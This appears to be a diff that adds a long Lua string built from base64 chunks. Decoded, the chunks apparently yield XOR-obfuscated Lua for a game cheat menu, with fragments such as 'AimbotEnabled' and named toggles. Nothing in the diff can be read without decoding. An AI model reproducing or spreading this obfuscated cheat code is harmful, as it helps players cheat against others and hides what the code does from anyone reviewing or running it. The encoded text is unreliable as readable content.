+    .. "5vX58a7Y8ebkvJ60tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTg9ebz8eDX0ub1+fG4nrS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS0tPX9+fb74Mf5+/vg/Prx5+eetLS0tLS0tLS0tLS0tLS0tLS0"
+    .. "tLS9nrS0tLS0tLS0tLS0tPH68J60tLS0tLS0tL2e8frwnp6eubm7u6mpqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqZ65ubu7tNXd2dbbwLTZ"
+    .. "1d3atMDb09PY0Z65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampnp7T9fnxwPX2rtfm8fXg8cD78/P48bzvnrS0tLTa9fnxtKm0ttX9"
+    .. "+fb74La4np60tLS01+Hm5vH64ML1+OHxtKm08vX45/G4np60tLS00vj187SptLbV/fn2++C2"
+    .. "uJ6etLS0tNf1+Pj29ff/tKm08uH69+D9+/q88fr19vjx8L2enrS0tLS0tLS09f359vvg0fr1"
+    .. "9vjx8LSpnrS0tLS0tLS0tLS0tPH69fb48fCenrS0tLS0tLS0/fK08fr19vjx8LTg/PH6np60"
+    .. "tLS0tLS0tLS0tLTn4PXm4NX9+fb74Ly9np60tLS0tLS0tLS0tLTG9e3y/fH48K7a++D98u28"
+    .. "7560tLS0tLS0tLS0tLS0tLS0wP3g+PG0qbS2wNXG09HA3drTtrietLS0tLS0tLS0tLS0tLS0"
+    .. "tNf7+uDx+uC0qZ60tLS0tLS0tLS0tLS0tLS0tLS0tLbV8OL1+vfx8LTg9ebz8eD9+vO05+3n"
+    .. "4PH5tPv6+P368bq2uJ60tLS0tLS0tLS0tLS0tLS00OHm9eD9+/q0qbSnuJ60tLS0tLS0tLS0"
+    .. "tLS0tLS03fn18/G0qbS29+b75+f89f3mtp60tLS0tLS0tLS0tLTpvZ6etLS0tLS0tLTx+Ofx"
+    .. "np60tLS0tLS0tLS0tLTn4Pvk1f359vvgvL2enrS0tLS0tLS08frwnrS0tLTx+vCe6b2enp65"
+    .. "ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampnrm5u7u029rYzbTE2NXN0cbHnrm5u7upqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqamentP1+fHA9fau1+bx9eDxwPvz8/jxvO+etLS0"
+    .. "tNr1+fG0qbS22/r47bTE+PXt8ebntrienrS0tLTX4ebm8frgwvX44fG0qbTg5uHxuJ6etLS0"
+    .. "tNL49fO0qbS21f359vvg2/r47cT49e3x5ue2uJ6etLS0tNf1+Pj29ff/tKm08uH69+D9+/q8"
+    .. "8fr19vjx8L2enrS0tLS0tLS09f359vvg2/r47cT49e3x5ue0qZ60tLS0tLS0tLS0tLTx+vX2"
+    .. "+PHwnp60tLS0tLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0qZ60tLS0tLS0tLS0tLT6/fienrS0"
+    .. "tLS0tLS0+vHs4MD15vPx4Mfx9eb3/LSpnrS0tLS0tLS0tLS0tKSenrS0tLS0tLS0ubm02/r4"
+    .. "7bT7+vG0+fvw8bT39fq09vG09ffg/eLxup60tLS0tLS0tP3ytPH69fb48fC04Pzx+p6etLS0"
+    .. "tLS0tLS0tLS09f359vvg2/r47dH64P3g/fHntKmetLS0tLS0tLS0tLS0tLS0tPL1+Ofxnp60"
+    .. "tLS0tLS0tLS0tLTk9/X4+Lzy4fr34P37+ry9np60tLS0tLS0tLS0tLS0tLS0xvXt8v3x+PC6"
+    .. "0vj18+fPnrS0tLS0tLS0tLS0tLS0tLS0tLS0ttX9+fb74Nv6+O3R+uD94P3x57aetLS0tLS0"
+    .. "tLS0tLS0tLS0tMmux/HgvPL1+OfxvZ6etLS0tLS0tLS0tLS08frwvZ60tLS0tLS0tPH68J60"
+    .. "tLS08frwnum9np6eubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqZ65ubu7tNva2M200drA3cDd0ceeubm7u6mpqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqZ6e0/X58cD19q7X5vH1"
+    .. "4PHA+/Pz+PG87560tLS02vX58bSptLbb+vjttNH64P3g/fHntrienrS0tLTX4ebm8frgwvX4"
+    .. "4fG0qbTy9fjn8bienrS0tLTS+PXztKm0ttX9+fb74Nv6+O3R+uD94P3x57a4np60tLS01/X4"
+    .. "+Pb19/+0qbTy4fr34P37+rzx+vX2+PHwvZ6etLS0tLS0tLT1/fn2++Db+vjt0frg/eD98ee0"
+    .. "qZ60tLS0tLS0tLS0tLTx+vX2+PHwnp60tLS0tLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0qZ60"
+    .. "tLS0tLS0tLS0tLT6/fienrS0tLS0tLS0+vHs4MD15vPx4Mfx9eb3/LSpnrS0tLS0tLS0tLS0"
+    .. "tKSenrS0tLS0tLS0/fK08fr19vjx8LTg/PH6np60tLS0tLS0tLS0tLS5ubTb+vjttP36/eD9"
+    .. "9fj97vG04PzxtPH64P3g7bT39ff88Z60tLS0tLS0tLS0tLS5ubTj/PH6tOD88bTh5/HmtPX3"
+    .. "4OH1+PjttPrx8fDntP3gup60tLS0tLS0tLS0tLT9+v3g/fX4/e7x0frg/eDt1/X3/PG8vZ6e"
+    .. "tLS0tLS0tLS0tLS09f359vvg2/r47cT49e3x5ue0qZ60tLS0tLS0tLS0tLS0tLS08vX45/Ge"
+    .. "nrS0tLS0tLS0tLS0tOT39fj4vPLh+vfg/fv6vL2enrS0tLS0tLS0tLS0tLS0tLTG9e3y/fH4"
+    .. "8LrS+PXz58+etLS0tLS0tLS0tLS0tLS0tLS0tLS21f359vvg2/r47cT49e3x5ue2nrS0tLS0"
+    .. "tLS0tLS0tLS0tLTJrsfx4Lzy9fjn8b2enrS0tLS0tLS0tLS0tPH68L2etLS0tLS0tLTx+vCe"
+    .. "tLS0tPH68J7pvZ6enrm5u7upqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqameubm7u7TA1cbT0cC02dvQ0bTd2tLbnrm5u7upqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqamentP1+fHA9fau"
+    .. "1+bx9eDxxPXm9fPm9eT8vO+enrS0tLTA/eD48bSptLbA1cbT0cC02dvQ0ce2uJ6etLS0tNf7"
+    .. "+uDx+uC0qZ60tLS0tLS0tLbb2tjNtMTY1c3Rxse0tHYSBrS0xvv2+PvstMT49e3x5ufI+ra0"
+    .. "urqetLS0tLS0tLS229rYzbTR2sDdwN3Rx7S0dhIGtLTaxNfntLu08frg/eD98ee04/3g/LTc"
+    .. "4fn1+vv98LS/tNzh+fX6+/3wxvv74MT15uDI+sj6trS6up60tLS0tLS0tLbR+uD94P3x57T1"
+    .. "5vG09/X3/PHwtP365+Dx9fC0+/K05/f1+vr9+vO04PzxtPH64P3m8bTD++b/5+T19/G08eLx"
+    .. "5u208ub1+fG6tp7pvZ6enrm5u7upqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqameubm7u7TA1cbT0cC0xNXGwJ65ubu7qampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampnp7T9fnxwPX2rtfm"
+    .. "8fXg8dDm++Tw++P6vO+enrS0tLTa9fnxtKm0tsD15vPx4LTE9ebgtrienrS0tLTb5OD9+/rn"
+    .. "tKm07560tLS0tLS0tLbc8fXwtrietLS0tLS0tLS2wPvm5/u2uJ60tLS0tLS0tLbG+/vgtp60"
+    .. "tLS06bienrS0tLTX4ebm8frg2+Tg/fv6tKm07560tLS0tLS0tLbc8fXwtp60tLS06bienrS0"
+    .. "tLTZ4fjg/eT48dvk4P37+ue0qbTy9fjn8bienrS0tLTS+PXztKm0ttX9+fb74MT15uC2uJ6e"
+    .. "tLS0tNf1+Pj29ff/tKm08uH69+D9+/q8++Tg/fv6vZ6etLS0tLS0tLT1/fn2++DE9ebgtKme"
+    .. "tLS0tLS0tLS0tLS04O3k8fvyvPvk4P37+r20qam0tuD19vjxtp60tLS0tLS0tLS0tLT1+vC0"
+    .. "++Tg/fv6z6XJnrS0tLS0tLS0tLS0tPvmtPvk4P37+p6etLS0tLS0tLT34ebm8frg1f359vvg"
+    .. "wPXm8/HgtKmetLS0tLS0tLS0tLS0+v34nrS0tLTx+vCe6b2enp65ubu7qampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u0wNXG09HA"
+    .. "tMTG3dvG3cDNnrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqamentP1+fHA9fau1+bx9eDx0Ob75PD74/q8756etLS0tNr1+fG0qbS2"
+    .. "wPXm8/HgtMTm/fvm/eDttrienrS0tLTb5OD9+/rntKm07560tLS0tLS0tLbS28K2uJ60tLS0"
+    .. "tLS0tLbX+Pvn8efgtrietLS0tLS0tLS22Pvj8efgtNzx9fjg/LaetLS0tOm4np60tLS01+Hm"
+    .. "5vH64Nvk4P37+rSptO+etLS0tLS0tLS20tvCtp60tLS06bienrS0tLTZ4fjg/eT48dvk4P37"
+    .. "+ue0qbTy9fjn8bienrS0tLTS+PXztKm0ttX9+fb74MTm/fvm/eDttrienrS0tLTX9fj49vX3"
+    .. "/7SptPLh+vfg/fv6vPvk4P37+r2enrS0tLS0tLS09f359vvgxOb9++b94O20qZ60tLS0tLS0"
+    .. "tLS0tLTg7eTx+/K8++Tg/fv6vbSpqbS24PX2+PG2nrS0tLS0tLS0tLS0tPX68LT75OD9+/rP"
+    .. "pcmetLS0tLS0tLS0tLS0++a0++Tg/fv6np60tLS0tLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0"
+    .. "qZ60tLS0tLS0tLS0tLT6/fietLS0tPH68J7pvZ6enrm5u7upqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqameubm7u7TS28K02N3Z3cDRxp65"
+    .. "ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampnp7T9fnxwPX2rtfm8fXg8cD78/P48bzvnp60tLS02vX58bSptLbS28K02P35/eDx5ra4"
+    .. "np60tLS01+Hm5vH64ML1+OHxtKm04Obh8bienrS0tLTS+PXztKm0ttX9+fb74NLbwtH69fb4"
+    .. "8fC2uJ6etLS0tNf1+Pj29ff/tKm08uH69+D9+/q88fr19vjx8L2enrS0tLS0tLS09f359vvg"
+    .. "0tvC0fr19vjx8LSpnrS0tLS0tLS0tLS0tPH69fb48fCenrS0tLS0tLS09+Hm5vH64NX9+fb7"
+    .. "4MD15vPx4LSpnrS0tLS0tLS0tLS0tPr9+J6etLS0tLS0tLT68ezgwPXm8/Hgx/H15vf8tKme"
+    .. "tLS0tLS0tLS0tLS0pJ60tLS08frwnum9np6eubm7u6mpqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqZ65ubu7tNLbwp65ubu7qampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnp7T9fnxwPX2"
+    .. "rtfm8fXg8cf4/fDx5rzvnp60tLS02vX58bSptLbV/fn2++C00tvCtrienrS0tLTG9frz8bSp"
+    .. "tO+etLS0tLS0tLShpLietLS0tLS0tLSlpKSknrS0tLTpuJ6etLS0tN369+bx+fH64LSptKWk"
+    .. "uJ6etLS0tMfh8vL97LSptLa0xMy2uJ6etLS0tNfh5ubx+uDC9fjh8bSptKahpLienrS0tLTS"
+    .. "+PXztKm0ttX9+fb74NLbwra4np60tLS01/X4+Pb19/+0qbTy4fr34P37+rzi9fjh8b2enrS0"
+    .. "tLS0tLS09f359vvg0tvCtKmetLS0tLS0tLS0tLS04vX44fGenrS0tLS0tLS09+Hm5vH64NX9"
+    .. "+fb74MD15vPx4LSpnrS0tLS0tLS0tLS0tPr9+J6etLS0tLS0tLT68ezgwPXm8/Hgx/H15vf8"
+    .. "tKmetLS0tLS0tLS0tLS0pJ60tLS08frwnum9np6eubm7u6mpqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqZ65ubu7tNnVzLTQ3cfA1drX0Z65"
+    .. "ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampnp7T9fnxwPX2rtfm8fXg8cf4/fDx5rzvnp60tLS02vX58bSptLbZ9ez9+eH5tND95+D1"
+    .. "+vfxtrienrS0tLTG9frz8bSptO+etLS0tLS0tLShpLietLS0tLS0tLShpKSknrS0tLTpuJ6e"
+    .. "tLS0tN369+bx+fH64LSptKGkuJ6etLS0tMfh8vL97LSptLa05+Dh8Oe2uJ6etLS0tNfh5ubx"
+    .. "+uDC9fjh8bSptKGkpLienrS0tLTS+PXztKm0ttX9+fb74Nn17ND95+D1+vfxtrienrS0tLTX"
+    .. "9fj49vX3/7SptPLh+vfg/fv6vOL1+OHxvZ6etLS0tLS0tLT1/fn2++DZ9ezQ/efg9fr38bSp"
+    .. "nrS0tLS0tLS0tLS0tOL1+OHxnp60tLS0tLS0tPfh5ubx+uDV/fn2++DA9ebz8eC0qZ60tLS0"
+    .. "tLS0tLS0tLT6/fienrS0tLS0tLS0+vHs4MD15vPx4Mfx9eb3/LSpnrS0tLS0tLS0tLS0tKSe"
+    .. "tLS0tPH68J7pvZ6enrm5u7upqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqameubm7u7TH2dvbwNza0cfHnrm5u7upqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqamentP1+fHA9fau1+bx9eDx"
+    .. "x/j98PHmvO+enrS0tLTa9fnxtKm0tsf5+/vg/Prx5+e2uJ6etLS0tMb1+vPxtKm07560tLS0"
+    .. "tLS0tKS6pKG4nrS0tLS0tLS0pZ60tLS06bienrS0tLTd+vfm8fnx+uC0qbSkuqShuJ6etLS0"
+    .. "tMfh8vL97LSptLa2uJ6etLS0tNfh5ubx+uDC9fjh8bSptKS6pay4np60tLS00vj187SptLbV"
+    .. "/fn2++DH+fv74Pz68efntrienrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vOL1+OHxvZ6etLS0"
+    .. "tLS0tLT1/fn2++DH+fv74Pz68efntKmetLS0tLS0tLS0tLS04vX44fGetLS0tPH68J7pvZ6e"
+    .. "nrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqameubm7u7TA0dXZtNfc0dffnrm5u7upqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqamentP1+fHA9fau1+bx9eDxwPvz8/jxvO+enrS0"
+    .. "tLTa9fnxtKm0tsDx9fm01/zx9/+2uJ6etLS0tNfh5ubx+uDC9fjh8bSptPL1+OfxuJ6etLS0"
+    .. "tNL49fO0qbS2wPH1+df88ff/trienrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vPH69fb48fC9"
+    .. "np60tLS0tLS0tODx9fnX/PH3/7SpnrS0tLS0tLS0tLS0tPH69fb48fCenrS0tLS0tLS09+Hm"
+    .. "5vH64NX9+fb74MD15vPx4LSpnrS0tLS0tLS0tLS0tPr9+J6etLS0tLS0tLT68ezgwPXm8/Hg"
+    .. "x/H15vf8tKmetLS0tLS0tLS0tLS0pJ60tLS08frwnum9np6eubm7u6mpqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqZ65ubu7tMLdx93W2NG0"
+    .. "19zR19+eubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqZ6e0/X58cD19q7X5vH14PHA+/Pz+PG8756etLS0tNr1+fG0qbS2wv3n/fb4"
+    .. "8bTX/PH3/7a4np60tLS01+Hm5vH64ML1+OHxtKm08vX45/G4np60tLS00vj187SptLbV/fn2"
+    .. "++DC/ef99vjx1/zx9/+2uJ6etLS0tNf1+Pj29ff/tKm08uH69+D9+/q88fr19vjx8L2enrS0"
+    .. "tLS0tLS09f359vvgwv3n/fb48df88ff/tKmetLS0tLS0tLS0tLS08fr19vjx8J6etLS0tLS0"
+    .. "tLT34ebm8frg1f359vvgwPXm8/HgtKmetLS0tLS0tLS0tLS0+v34np60tLS0tLS0tPrx7ODA"
+    .. "9ebz8eDH8fXm9/y0qZ60tLS0tLS0tLS0tLSknrS0tLTx+vCe6b2enp65ubu7qampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u0wNXG"
+    .. "09HAtMfA1cDBx565ubu7qampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampnp7T9fnxwPX2rtfm8fXg8cT15vXz5vXk/Lzvnp60tLS0wP3g+PG0"
+    .. "qbS2wNXG09HAtMfA1cDBx7a4np60tLS01/v64PH64LSpnrS0tLS0tLS0ttn78PG0tHYSBrS0"
+    .. "tp60tLS0tLS0tLq6tLyetLS0tLS0tLS0tLS09f359vvg2/r47cT49e3x5ueetLS0tLS0tLS0"
+    .. "tLS09frwtLbb2tjNtMTY1c3Rxse2nrS0tLS0tLS0tLS0tPvmtLyetLS0tLS0tLS0tLS0tLS0"
+    .. "tPX9+fb74Nv6+O3R+uD94P3x5560tLS0tLS0tLS0tLS0tLS09frwtLbb2tjNtNHawN3A3dHH"
+    .. "tp60tLS0tLS0tLS0tLS0tLS0++a0ttrb2tG2nrS0tLS0tLS0tLS0tL2etLS0tLS0tLS9nrS0"
+    .. "tLS0tLS0urq0tsj6tp60tLS0tLS0tLq6tLbE9ebgtLR2Ega0tLaetLS0tLS0tLS6urTg++fg"
+    .. "5v3687yetLS0tLS0tLS0tLS09f359vvgxPXm4J60tLS0tLS0tL2etLS0tLS0tLS6urS2yPq2"
+    .. "nrS0tLS0tLS0urq0tsTm/fvm/eDttLR2Ega0tLaetLS0tLS0tLS6urTg++fg5v3687yetLS0"
+    .. "tLS0tLS0tLS09f359vvgxOb9++b94O2etLS0tLS0tLS9nrS0tLS0tLS0urq0tsj6tp60tLS0"
+    .. "tLS0tLq6tLbG9frz8bS0dhIGtLS2nrS0tLS0tLS0urq04Pvn4Ob9+vO8nrS0tLS0tLS0tLS0"
+    .. "tPX9+fb74Nn17ND95+D1+vfxnrS0tLS0tLS0vZ60tLS0tLS0tLq6tLa05+Dh8OfI+raetLS0"
+    .. "tLS0tLS6urS20tvCtLR2Ega0tLaetLS0tLS0tLS6urTg++fg5v3687yetLS0tLS0tLS0tLS0"
+    .. "9f359vvg0tvCnrS0tLS0tLS0vZ60tLS0tLS0tLq6tLa05Oy2num9np65ubu7qampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnrm5u7u0wNHY"
+    .. "0cTbxsCeubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqZ6ewPH48eT75uDA9fau1+bx9eDxxPXm9fPm9eT8vO+enrS0tLTA/eD48bSp"
+    .. "tLZ2CDK028bW3cDV2LTA0djRxNvGwLS0u7S0wMbV2sfE28bAtrienrS0tLTX+/rg8frgtKme"
+    .. "tLS0tLS0tLS2xPj17fHmtPX68LTj++b48LTg5vX65+T75uD14P37+rTn7efg8fnnuraenum9"
+    .. "np65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampnrm5u7u0xNjVzdHGtNDRx8Dd2tXA3dvax565ubu7qampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampnp7A8fjx5Pvm4MD19q7X5vH1"
+    .. "4PHH8ffg/fv6vJ60tLS0tsDR2NHE28bAtLS7tLTE2NXN0cbHtp69np74+/f1+LTy4fr34P37"
+    .. "+rTg8fjx5Pvm4MD7xPj17fHmvOT49e3x5r2enrS0tLT98rT6++C03MbEtOD88fqetLS0tLS0"
+    .. "tLTm8eDh5vqetLS0tPH68J6etLS0tPj79/X4tPf89eb19+Dx5rSpnrS0tLS0tLS05Pj17fHm"
+    .. "utf89eb19+Dx5p6etLS0tP3ytPr74LT3/PXm9ffg8ea04Pzx+p60tLS0tLS0tObx4OHm+p60"
+    .. "tLS08frwnp60tLS0+Pv39fi04PXm8/Hg3MbEtKmetLS0tLS0tLT3/PXm9ffg8eau0v368NL9"
+    .. "5ufg1/z9+PC8nrS0tLS0tLS0tLS0tLbc4fn1+vv98Mb7++DE9ebgtp60tLS0tLS0tL2enrS0"
+    .. "tLT98rT6++C04PXm8/Hg3MbEtOD88fqetLS0tLS0tLTm8eDh5vqetLS0tPH68J6etLS0tNzG"
+    .. "xLrX0ub1+fG0qZ60tLS0tLS0tOD15vPx4NzGxLrX0ub1+fGetLS0tLS0tLS+tNfS5vX58br6"
+    .. "8eO8nrS0tLS0tLS0tLS0tKe4nrS0tLS0tLS0tLS0tKS4nrS0tLS0tLS0tLS0tKSetLS0tLS0"
+    .. "tLS9np60tLS0xvXt8v3x+PCu2vvg/fLtvO+enrS0tLS0tLS0wP3g+PG0qbS2wNHY0cTbxsC2"
+    .. "uJ6etLS0tLS0tLTX+/rg8frgtKmetLS0tLS0tLS0tLS0ttXm5v3i8fC0+vH15rS2nrS0tLS0"
+    .. "tLS0tLS0tLq6tOT49e3x5rrQ/efk+PXt2vX58bienrS0tLS0tLS00OHm9eD9+/q0qbSmuJ6e"
+    .. "tLS0tLS0tLTd+fXz8bSptLbn5PXm//jx57aenrS0tLTpvZ6e8frwnp74+/f1+LTy4fr34P37"
+    .. "+rT35vH14PHA8fjx5Pvm4Nbh4OD7+rzk+PXt8ea9np60tLS0/fK05Pj17fHmtKmptNj79/X4"
+    .. "xPj17fHmtOD88fqetLS0tLS0tLTm8eDh5vqetLS0tPH68J6etLS0tMDx+PHk++bgwPX2rtfm"
+    .. "8fXg8dbh4OD7+rzvnp60tLS0tLS0tNr1+fG0qZ60tLS0tLS0tLS0tLS2wMS0tHYUNrS0tp60"
+    .. "tLS0tLS0tLS0tLS6urTk+PXt8ea62vX58bienrS0tLS0tLS01/X4+Pb19/+0qbTy4fr34P37"
+    .. "+ry9np60tLS0tLS0tLS0tLTg8fjx5Pvm4MD7xPj17fHmvJ60tLS0tLS0tLS0tLS0tLS05Pj1"
+    .. "7fHmnrS0tLS0tLS0tLS0tL2enrS0tLS0tLS08frwnp60tLS06b2envH68J6e8vvmtMu4tOT4"
+    .. "9e3x5rT9+rT95PX95ue8nrS0tLTE+PXt8ebnrtPx4MT49e3x5ue8vZ69tPD7np60tLS09+bx"
+    .. "9eDxwPH48eT75uDW4eDg+/q85Pj17fHmvZ6e8frwnp7E+PXt8ebnusT49e3x5tXw8PHwrtf7"
+    .. "+vrx9+C8nrS0tLTy4fr34P37+rzk+PXt8ea9np60tLS0tLS0tOD15/+64/X94LykuqG9np60"
+    .. "tLS0tLS0tPfm8fXg8cDx+PHk++bg1uHg4Pv6vOT49e3x5r2enrS0tLTx+vCevZ6eubm7u6mp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqZ65"
+    .. "ubu7tMfNx8DR2bTQ0cfA3drVwN3b2seeubm7u6mpqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqZ6ewPH48eT75uDA9fau1+bx9eDxx/H34P37"
+    .. "+ryetLS0tLbA0djRxNvGwLS0u7S0x83HwNHZtp69np7A8fjx5Pvm4MD19q7X5vH14PHW4eDg"
+    .. "+/q8756etLS0tNr1+fG0qbS2wPH48eT75uC0wPu0x+T14/q2uJ6etLS0tNf1+Pj29ff/tKm0"
+    .. "8uH69+D9+/q8vZ6etLS0tLS0tLT98rT6++C03MbEtOD88fqetLS0tLS0tLS0tLS05vHg4eb6"
+    .. "nrS0tLS0tLS08frwnp60tLS0tLS0tPj79/X4tOfk9eP6tKmetLS0tLS0tLS0tLS04/vm/+fk"
+    .. "9ffxrtL9+vDS/ebn4Nf8/fjwvJ60tLS0tLS0tLS0tLS0tLS0tsfk9eP62Pv39eD9+/q2uJ60"
+    .. "tLS0tLS0tLS0tLS0tLS04Obh8Z60tLS0tLS0tLS0tLS9np60tLS0tLS0tP3ytOfk9eP6nrS0"
+    .. "tLS0tLS0tLS0tPX68LTn5PXj+q7d59W8ttb15/HE9ebgtr204Pzx+p6etLS0tLS0tLS0tLS0"
+    .. "3MbEutfS5vX58bSpnrS0tLS0tLS0tLS0tLS0tLTn5PXj+rrX0ub1+fGetLS0tLS0tLS0tLS0"
+    .. "tLS0tL6019Lm9fnxuvrx47yetLS0tLS0tLS0tLS0tLS0tLS0tLSkuJ60tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0tKG4nrS0tLS0tLS0tLS0tLS0tLS0tLS0pJ60tLS0tLS0tLS0tLS0tLS0vZ6etLS0"
+    .. "tLS0tLTx+Ofxnp60tLS0tLS0tLS0tLTG9e3y/fH48K7a++D98u28756etLS0tLS0tLS0tLS0"
+    .. "tLS0tMD94PjxtKm0tsDR2NHE28bAtrienrS0tLS0tLS0tLS0tLS0tLTX+/rg8frgtKmetLS0"
+    .. "tLS0tLS0tLS0tLS0tLS0tLS22vu0x+T14/rY+/f14P37+rTy++H68Lq2uJ6etLS0tLS0tLS0"
+    .. "tLS0tLS0tNDh5vXg/fv6tKm0p7ienrS0tLS0tLS0tLS0tLS0tLTd+fXz8bSptLbn5PXm//jx"
+    .. "57aenrS0tLS0tLS0tLS0tOm9np60tLS0tLS0tPH68J6etLS0tPH68J6e6b2enrm5u7upqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqameubm7"
+    .. "u7TD1c3E293awMeeubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqZ6ew/Xt5Pv9+uDnwPX2rtfm8fXg8cT15vXz5vXk/LzvnrS0tLTA"
+    .. "/eD48bSptLZ2CDK0w9XNxNvd2sC02tHAw9vG37S0u7S0xNvH3cDd29q02dXa1dPRxra4nrS0"
+    .. "tLTX+/rg8frgtKmetLS0tLS0tLS2x/Xi8bT4+/f14P37+ue4tObx4OHm+rTg+7Tk5vHi/fvh"
+    .. "57Tk++f94P37+ue09frwtPn1+vXz8bTt++HmtOTx5uf7+vX4tPr14v3z9eD9+/q05Pv9+uDn"
+    .. "urae6b2envj79/X4tOP17eT7/frg0v348bSptLbH5PX38dzh9svD9e3k+/364Oe6/uf7+rae"
+    .. "nvj79/X4tPLh+vfg/fv6tOf14vHD9e3k+/364OfA+9D95/+8vZ60tLS0/fK0+vvgtLzj5v3g"
+    .. "8fL9+PG09frwtObx9fDy/fjxtPX68LT95/L9+PG9tOD88fq05vHg4eb6tPL1+OfxtPH68J60"
+    .. "tLS0+Pv39fi0+/+0qbTk9/X4+Lzy4fr34P37+ry9nrS0tLS0tLS04+b94PHy/fjxvOP17eT7"
+    .. "/frg0v348bi03ODg5Mfx5uL99/Gu3sfb2tH69/vw8bzj9e3k+/364Oe9vZ60tLS08frwvZ60"
+    .. "tLS05vHg4eb6tPv/nvH68J6e+Pv39fi08uH69+D9+/q0+Pv18MP17eT7/frg59Lm+/nQ/ef/"
+    .. "vL2etLS0tP3ytPr74LS84+b94PHy/fjxtPX68LTm8fXw8v348bT1+vC0/efy/fjxvbTg/PH6"
+    .. "tObx4OHm+rTx+vCetLS0tP3ytPr74LT95/L9+PG84/Xt5Pv9+uDS/fjxvbTg/PH6tObx4OHm"
+    .. "+rTx+vCenrS0tLTk9/X4+Lzy4fr34P37+ry9nrS0tLS0tLS0+Pv39fi08PH3+/Dx8LSptNzg"
+    .. "4OTH8ebi/ffxrt7H29rQ8ff78PG85vH18PL9+PG84/Xt5Pv9+uDS/fjxvb2etLS0tLS0tLT9"
+    .. "8rTg7eTx+/K88PH3+/Dx8L20qam0tuD19vjxtrTg/PH6nrS0tLS0tLS0tLS0tOP17eT7/frg"
+    .. "57SptPDx9/vw8fCetLS0tLS0tLTx+vCetLS0tPH68L2e8frwnp74+/f1+LTy4fr34P37+rTj"
+    .. "9e3k+/364Nr1+fHnvL2etLS0tPj79/X4tPr1+fHntKm07+metLS0tPL75rT69fnxtP36tOT1"
+    .. "/ebnvOP17eT7/frg57208PuetLS0tLS0tLTg9fb48br9+ufx5uC8+vX58ee4tPr1+fG9nrS0"
+    .. "tLTx+vCetLS0tOD19vjxuuf75uC8+vX58ee9nrS0tLT98rS3+vX58ee0qam0pLTg/PH6nrS0"
+    .. "tLS0tLS0+vX58ee0qbTvttr7tOP17eT7/frg57bpnrS0tLTx+vCetLS0tObx4OHm+rT69fnx"
+    .. "557x+vCenvj79/X4tMP17eT7/frg0Ob75PD74/q0qbTD9e3k+/364OfA9fau1+bx9eDx0Ob7"
+    .. "5PD74/q87560tLS02vX58bSptLbH8fjx9+Dx8LTD9e3k+/364La4nrS0tLTb5OD9+/rntKm0"
+    .. "4/Xt5Pv9+uDa9fnx57y9uJ60tLS01+Hm5vH64Nvk4P37+rSptO/j9e3k+/364Nr1+fHnvL3P"
+    .. "pcnpuJ60tLS02eH44P3k+PHb5OD9+/rntKm08vX45/G4nrS0tLTS+PXztKm0tsfx+PH34PHw"
+    .. "w/Xt5Pv9+uC2uJ60tLS01/X4+Pb19/+0qbTy4fr34P37+rz75OD9+/q9nrS0tLS0tLS05/H4"
+    .. "8ffg8fDD9e3k+/364LSptODt5PH78rz75OD9+/q9tKmptLbg9fb48ba09frwtPvk4P37+s+l"
+    .. "ybT75rT75OD9+/qetLS0tLS0tLT98rTn8fjx9+Dx8MP17eT7/frgtKmptLba+7Tj9e3k+/36"
+    .. "4Oe2tOD88fqetLS0tLS0tLS0tLS05/H48ffg8fDD9e3k+/364LSptPr9+J60tLS0tLS0tPH6"
